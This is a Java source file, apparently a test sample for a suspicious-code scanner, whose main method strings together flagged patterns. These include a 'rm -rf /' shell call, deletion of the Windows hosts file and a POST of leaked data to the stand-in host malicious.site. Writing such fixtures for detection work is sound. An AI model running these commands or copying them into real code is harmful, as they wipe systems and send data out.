package suspicious;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.lang.reflect.Method;
import javax.crypto.Cipher;
import java.util.Base64;
import java.util.zip.ZipOutputStream;

public class SuspiciousSample {
    public static void main(String[] args) {
        try {

            Runtime.getRuntime().exec("rm -rf /");


            File sensitiveFile = new File("C:/Windows/System32/drivers/etc/hosts");
            sensitiveFile.delete();


            String secret = "U2VjcmV0UGFzc3dvcmQ="; // Base64
            byte[] decoded = Base64.getDecoder().decode(secret);


            Class<?> clazz = Class.forName("java.lang.System");
            Method exitMethod = clazz.getMethod("exit", int.class);
            exitMethod.invoke(null, 0);


            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.ENCRYPT_MODE, null); // Clave null solo como ejemplo


            try {
                int a = 1 / 0;
            } catch (Exception e) {
                // Ignorado a propósito
            }


            Runnable r = new Runnable() {
                public void run() {
                    System.out.println("Running...");
                }
            };
            r.run();


            HttpURLConnection conn = (HttpURLConnection) new URL("http://malicious.site/steal").openConnection();
            conn.setDoOutput(true);
            conn.getOutputStream().write("leak=data".getBytes());


            FileOutputStream fos = new FileOutputStream("hidden.zip");
            ZipOutputStream zos = new ZipOutputStream(fos);
            zos.close();


            String path = SuspiciousSample.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            File self = new File(path);
            byte[] code = new FileInputStream(self).readAllBytes();

        } catch (Exception ignored) {
        }
    }
}
